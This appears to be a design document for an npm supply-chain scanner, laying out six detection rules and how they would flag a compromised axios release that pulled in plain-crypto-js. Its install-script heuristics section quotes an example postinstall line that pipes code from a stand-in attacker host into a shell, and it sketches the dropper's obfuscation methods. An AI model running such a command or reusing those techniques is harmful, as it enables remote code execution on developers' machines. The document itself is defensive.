# Detection rules

v0.1 implements six rules. Each rule has an ID, a plain-language description,
what it catches, what it misses, and a severity.

Severity levels: `low`, `medium`, `high`. A finding's severity is the max of
the severities of the rules that fired on it.

## R1 — Dependency diff

**What it does.** For each direct dependency in the lockfile, compare its
declared dependencies against the previously-installed version (if known from
a prior scan's cache, or from the previous lockfile if git is available).
Flag any *additions*, especially transitive ones that weren't there before.

**What it catches.** The exact axios pattern: a previously-clean package
suddenly gains a new dependency it never had. This is the single most
valuable rule in v0.1.

**What it misses.** First-time installs where there's no prior version to
compare against. First-run on a project the tool has never seen before can
only compare declared dependencies against the latest *other* published
versions of that package.

**Severity.** High if the newly-added dep also triggers R2 or R3. Medium
otherwise.

**Implementation notes.** Needs to handle both the "we have a cached record
of the previous version" case and the "git log tells us the previous
lockfile" case. Start with the cache case; git integration can wait.

## R2 — Package age

**What it does.** Flag any package (direct or transitive) whose first publish
date is within the last N days. Default N = 14.

**What it catches.** Brand-new packages used as payload delivery vehicles,
like plain-crypto-js (published hours before being pulled in as a dep).

**What it misses.** Packages that have existed for months before being
weaponized (maintainer compromise of a mature package).

**Severity.** Low by itself. Medium if the package also has install scripts.
High if combined with R1.

**Implementation notes.** Registry API gives us `time.created` and
`time.modified`. Cache aggressively — a package's creation date doesn't
change.

## R3 — Install script presence

**What it does.** Flag any package that declares a `preinstall`, `install`,
or `postinstall` script in its `package.json`.

**What it catches.** Any attack that relies on the install lifecycle, which
is most of them. axios/plain-crypto-js absolutely triggers this.

**What it misses.** Attacks that don't use install scripts. Also produces
false positives on legitimate native-module packages (node-gyp, sharp,
better-sqlite3, etc.) — these will need an allowlist or a lower default
severity.

**Severity.** Low by default. Rises to medium/high when combined with other
rules.

**Implementation notes.** This is the most false-positive-prone rule. The
allowlist of legitimate install-script users needs care. Start with the top
100 most-downloaded packages that have install scripts for native
compilation.

## R4 — Install script content heuristics

**When it runs.** R4 is a second-pass rule (see architecture.md D8). It
runs **only** on packages that have already triggered at least one other
rule (R1, R2, R3, R5, or R6) in the current scan. Clean-looking packages
never pay the tarball-fetch cost.

**What it does.** For a package that reached pass 2, fetch its tarball
from the registry, extract in-memory, and apply heuristics to two bodies
of text:

1. The script strings themselves from `package.json`'s `scripts` field
   (inline attacks like `"postinstall": "curl evil.com | sh"`).
2. The contents of any script files referenced by those script strings
   (e.g., `setup.js` for `"postinstall": "node setup.js"`).

Heuristics include: network calls (`http`, `https`, `fetch`,
`net.connect`), child process spawning (`child_process`, `exec`, `spawn`),
file writes outside the package directory, high-entropy strings (likely
obfuscation), calls to `eval` or `Function()` with dynamic input,
base64-decoded-then-executed patterns, `String.fromCharCode` with
arithmetic, `replaceAll` used for character substitution.

Only files directly referenced from the `scripts` field are read. Files
transitively `require`d from those scripts are not chased in v0.1 (could
be added later if it turns out to matter).

**What it catches.** The setup.js dropper used reversed Base64 with
padding substitution and XOR keyed `OrDeR_7077`. Entropy thresholds and
`String.fromCharCode` / `replaceAll` patterns would trip here.

**What it misses.** Heavily obfuscated scripts that don't match any of
our patterns. Scripts that fetch their payload from a benign-looking
source and only become malicious at runtime. Payloads hidden in
transitively-required files (scope limitation above).

**Severity.** Medium by default. High if multiple heuristics fire in the
same script.

**Implementation notes.** This is where AI-assisted pattern generation
will be tempting and dangerous. The heuristics need to be conservative —
false positives here poison trust in the tool. Build a corpus of
known-malicious scripts and known-benign scripts, and require every new
heuristic to do better than 0 false positives on the benign corpus before
shipping. Tarball extraction uses stdlib `archive/tar` + `compress/gzip`;
no third-party library.

## R5 — Typosquat distance

**What it does.** For each package, compute Levenshtein distance against a
baked-in list of the top 10k most-downloaded packages. Flag distance <= 2
where the package itself is not in the popular list.

**What it catches.** `plain-crypto-js` vs `crypto-js` (distance 6, so
actually wouldn't catch this one — but catches things like `lodah` vs
`lodash`, `expres` vs `express`).

**What it misses.** Attacks that don't rely on typosquatting, which includes
the axios case (different technique entirely).

**Severity.** Medium.

**Implementation notes.** The popular-package list is a compile-time asset.
Refresh it quarterly. Do not fetch it at runtime.

## R6 — Maintainer change

**What it does.** For each package, compare the publisher of the latest
version against the publishers of the previous N versions. Flag if the
latest version's publisher is new to this package.

**What it catches.** Maintainer account compromises where the attacker
publishes under the legitimate maintainer's account (the axios case) — but
only if the account changed email/metadata. Also catches cases where a
previously-dormant co-maintainer suddenly publishes.

**What it misses.** Pure credential theft where the attacker uses the
legitimate maintainer's account with no metadata changes. In the axios case,
the email *was* changed — but we'd only catch that with API fields we need
to verify are exposed.

**Severity.** Medium. High if combined with R1 or R2.

**Implementation notes.** Registry `_npmUser` field on version metadata is
the data source. This rule needs careful false-positive handling — projects
legitimately add new maintainers all the time. Probably only flag when the
new maintainer's *first-ever* publish on this package is the latest version.

## What the full ruleset catches on axios

Running against axios@1.14.1 in an environment where we'd previously seen
axios@1.14.0:

- R1 fires: plain-crypto-js is a new transitive dependency.
- R2 fires: plain-crypto-js is hours old.
- R3 fires: plain-crypto-js has a postinstall hook.
- R4 fires: setup.js contains obfuscation patterns.
- R5 doesn't fire: plain-crypto-js isn't close enough to crypto-js.
- R6 may fire: the jasonsaayman account's email changed. Depends on whether
  the API exposes this.

Four to five high-confidence rule hits on a single package. That's exactly
the profile we want: no single rule is sufficient, but the combination is
hard to produce by accident.
